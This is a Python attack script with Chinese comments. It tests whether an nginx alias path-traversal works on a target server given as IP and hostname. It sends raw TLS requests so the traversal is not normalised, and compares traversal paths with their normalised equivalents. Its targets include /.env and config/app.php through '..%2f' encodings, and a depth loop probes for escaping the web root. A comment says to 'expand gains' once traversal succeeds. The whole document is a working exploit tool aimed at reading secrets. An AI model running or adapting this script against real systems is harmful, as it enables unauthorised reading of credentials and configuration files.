#!/usr/bin/env python3
# 归一化等价对照法：判定「前缀映射(alias)路径穿越」是真实生效还是被 nginx 归一化吃掉。
# 核心思路：穿越路径 R = P(../)^n + T 必然等价于某个「普通直连路径」Q。
#   若 resp(R) == resp(Q) 字节级一致 ⇒ 归一化已发生（或 alias 未拼接），穿越是 no-op，别再瞎试编码；
#   若 resp(R) != resp(Q)     ⇒ alias 把 .. 直接丢给文件系统，穿越真实生效，立即沿该编码扩大战果。
import socket, ssl, sys, time

IP, HOST = sys.argv[1], sys.argv[2]

def req(path, timeout=12):
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection((IP, 443), timeout=timeout), server_hostname=HOST)
    # 关键：raw socket 直发请求行，避免 curl/浏览器自身把 ../ 归一化掉
    s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n" % (path, HOST)).encode("latin-1"))
    d = b""
    while True:
        try:
            c = s.recv(65535)
        except Exception:
            break
        if not c:
            break
        d += c
    s.close()
    hdr, _, body = d.partition(b"\r\n\r\n")
    code = hdr.split(b"\r\n")[0].split(b" ")[1]
    return code.decode(), len(body), body

PAIRS = [
    # (穿越路径, 其归一化等价直连路径)
    ("/app/admin/..%2fconfig/app.php",                    "/app/config/app.php"),
    ("/app/admin/..%2f..%2fconfig/app.php",               "/config/app.php"),
    ("/app/admin/../component/pear/css/pear.css",         "/app/component/pear/css/pear.css"),
    ("/static/..%2f..%2f.env",                            "/.env"),
]
for trav, plain in PAIRS:
    a, b = req(trav), (time.sleep(2), req(plain))[1]
    same = (a[0], a[1], a[2]) == (b[0], b[1], b[2])
    print("[%s] %-52s vs [%s] %-32s => %s" % (a[0], trav, b[0], plain,
          "SAME(被归一化, 穿越无效)" if same else "DIFF(穿越可能真实生效!)"))
    time.sleep(2)

# 深度边界：归一化后逃出站点根的一律 400 (nginx Bad Request)
for d in (1, 2, 3, 4, 5):
    p = "/app/admin/" + "..%2f" * d + ".env"
    c, bl, _ = req(p)
    print("[%s] %-6d %s" % (c, bl, p))
    time.sleep(2)
